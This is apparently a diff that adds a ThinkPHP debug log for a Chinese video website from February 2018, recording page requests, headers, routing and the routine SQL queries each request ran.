+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000446s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000105s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000462s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000157s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000112s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000117s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:16+08:00 ] 111.206.170.62 GET /index/video/tv/cid/4
+[ info ] tp.chenjiangjiang.cn/index/video/tv/cid/4 [运行时间：0.023906s][吞吐率：41.83req/s] [内存消耗：2,636.02kb] [文件加载：56]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'tv',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '4',
+)
+[ info ] [ RUN ] app\index\controller\Video->tv[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/tv.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'Video',
+  4 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000213s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000694s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 4 LIMIT 1 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000129s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 4  AND `isdel` = '0' ORDER BY `ordeby`  desc [ RunTime:0.000168s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0'  AND `pid` = 4 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000509s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 6 LIMIT 6 [ RunTime:0.000303s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 44 LIMIT 6 [ RunTime:0.000228s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:38+08:00 ] 111.206.170.62 GET /index/video/gd/cid/6
+[ info ] tp.chenjiangjiang.cn/index/video/gd/cid/6 [运行时间：0.024629s][吞吐率：40.60req/s] [内存消耗：2,704.92kb] [文件加载：59]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'gd',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/tv/cid/4',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '6',
+)
+[ info ] [ RUN ] app\index\controller\Video->gd[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/gd.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'page',
+  4 => 'dname',
+  5 => 'fcid',
+  6 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000229s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000659s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 6 LIMIT 1 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SELECT `pid` FROM `bw_category` WHERE  `cid` = 6 LIMIT 1 [ RunTime:0.000112s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 4 LIMIT 1 [ RunTime:0.000107s ]
+[ sql ] [ SQL ] SELECT `cid` FROM `bw_category` WHERE  `cid` = 4 LIMIT 1 [ RunTime:0.000103s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000513s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_video` WHERE  `xcid` = 6  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000223s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `xcid` = 6  AND `isdel` = '0' LIMIT 0,12 [ RunTime:0.000241s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:46+08:00 ] 111.206.170.62 GET /index/video/tv/cid/28
+[ info ] tp.chenjiangjiang.cn/index/video/tv/cid/28 [运行时间：0.024113s][吞吐率：41.47req/s] [内存消耗：2,618.91kb] [文件加载：56]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'tv',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/4',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/gd/cid/6',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '28',
+)
+[ info ] [ RUN ] app\index\controller\Video->tv[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/tv.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'Video',
+  4 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000269s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000670s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 28 LIMIT 1 [ RunTime:0.000136s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000135s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 28  AND `isdel` = '0' ORDER BY `ordeby`  desc [ RunTime:0.000121s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0'  AND `pid` = 28 [ RunTime:0.000118s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000505s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 42 LIMIT 6 [ RunTime:0.000258s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:46+08:00 ] 111.206.170.62 GET /index/video/tv/cid/28
+[ info ] tp.chenjiangjiang.cn/index/video/tv/cid/28 [运行时间：0.023503s][吞吐率：42.55req/s] [内存消耗：2,618.91kb] [文件加载：56]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'tv',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/gd/cid/6',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/tv/cid/28',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '28',
+)
+[ info ] [ RUN ] app\index\controller\Video->tv[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/tv.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'Video',
+  4 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000272s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000688s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 28 LIMIT 1 [ RunTime:0.000151s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000126s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000130s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000127s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 28  AND `isdel` = '0' ORDER BY `ordeby`  desc [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0'  AND `pid` = 28 [ RunTime:0.000118s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 42 LIMIT 6 [ RunTime:0.000148s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:47+08:00 ] 111.206.170.62 GET /index/video/single/vid/22
+[ info ] tp.chenjiangjiang.cn/index/video/single/vid/22 [运行时间：0.028214s][吞吐率：35.44req/s] [内存消耗：2,710.98kb] [文件加载：61]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'single',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/28',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/tv/cid/28',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'vid' => '22',
+)
+[ info ] [ RUN ] app\index\controller\Video->single[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/single.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'info',
+  4 => 'count',
+  5 => 'data3',
+  6 => 'sc',
+  7 => 'xname',
+  8 => 'dname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000278s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000748s ]
+[ sql ] [ SQL ] SELECT `xcid` FROM `bw_video` WHERE  `vid` = 22 LIMIT 1 [ RunTime:0.000222s ]
+[ sql ] [ SQL ] SELECT `dcid` FROM `bw_video` WHERE  `vid` = 22 LIMIT 1 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000470s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 42 LIMIT 1 [ RunTime:0.000172s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 28 LIMIT 1 [ RunTime:0.000177s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vid` = 22 LIMIT 1 [ RunTime:0.000204s ]
+[ sql ] [ SQL ] UPDATE `bw_video`  SET `vplay`=7  WHERE  `vid` = 22 [ RunTime:0.000263s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000152s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000129s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vid` = 22  AND `isdel` = '0' [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_reply` [ RunTime:0.000504s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_reply` WHERE  `vid` = 22  AND `isdel` = '0' [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_reply` WHERE  `vid` = 22  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000187s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `xcid` = 42  AND `isdel` = '0' ORDER BY `vplay`  desc LIMIT 5 [ RunTime:0.000238s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_scang` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_scang` WHERE  `uid` IS NULL  AND `vid` = 22 [ RunTime:0.000187s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:47+08:00 ] 111.206.170.62 GET /index/video/getData/vid/22
+[ info ] tp.chenjiangjiang.cn/index/video/getData/vid/22 [运行时间：0.013556s][吞吐率：73.77req/s] [内存消耗：1,604.88kb] [文件加载：46]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'getData',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/28',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/single/vid/22',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'vid' => '22',
+)
+[ info ] [ RUN ] app\index\controller\Video->getData[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-02-27T18:50:56+08:00 ] 111.206.170.62 GET /index/video/tv/cid/31
+[ info ] tp.chenjiangjiang.cn/index/video/tv/cid/31 [运行时间：0.024049s][吞吐率：41.58req/s] [内存消耗：2,620.36kb] [文件加载：56]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'tv',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/tv/cid/28; jiathis_rdc=%7B%22http%3A//tp.chenjiangjiang.cn/index/video/single/vid/22%22%3A%220%7C1519728691052%22%7D',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/single/vid/22',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '31',
+)
+[ info ] [ RUN ] app\index\controller\Video->tv[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/tv.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'Video',
+  4 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000209s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000669s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 31 LIMIT 1 [ RunTime:0.000142s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000157s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000122s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 31  AND `isdel` = '0' ORDER BY `ordeby`  desc [ RunTime:0.000119s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0'  AND `pid` = 31 [ RunTime:0.000136s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 43 LIMIT 6 [ RunTime:0.000229s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:57+08:00 ] 111.206.170.62 GET /index/video/tv/cid/4
+[ info ] tp.chenjiangjiang.cn/index/video/tv/cid/4 [运行时间：0.023346s][吞吐率：42.83req/s] [内存消耗：2,636.14kb] [文件加载：56]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'video',
+    2 => 'tv',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'UM_distinctid=161d4ba5cfe5b2-098dcf829f3f21-393d5d0e-100200-161d4ba5cff45f; PHPSESSID=lr32ag2nighsc3k4rcnbbe9c02; jiathis_rdc=%7B%22http%3A//tp.chenjiangjiang.cn/index/video/single/vid/22%22%3A%220%7C1519728691052%22%7D; hzy_login_back=http://tp.chenjiangjiang.cn/index/video/single/vid/22',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/video/tv/cid/31',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'cid' => '4',
+)
+[ info ] [ RUN ] app\index\controller\Video->tv[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Video.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/video/tv.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data',
+  3 => 'Video',
+  4 => 'name',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000200s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000665s ]
+[ sql ] [ SQL ] SELECT `classname` FROM `bw_category` WHERE  `cid` = 4 LIMIT 1 [ RunTime:0.000136s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 4  AND `isdel` = '0' ORDER BY `ordeby`  desc [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `isdel` = '0'  AND `pid` = 4 [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 6 LIMIT 6 [ RunTime:0.000239s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `xcid` = 44 LIMIT 6 [ RunTime:0.000217s ]
+---------------------------------------------------------------
+[ 2018-02-27T18:50:59+08:00 ] 111.206.170.62 GET /index/video/single/vid/32
+[ info ] tp.chenjiangjiang.cn/index/video/single/vid/32 [运行时间：0.028961s][吞吐率：34.53req/s] [内存消耗：2,715.70kb] [文件加载：61]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
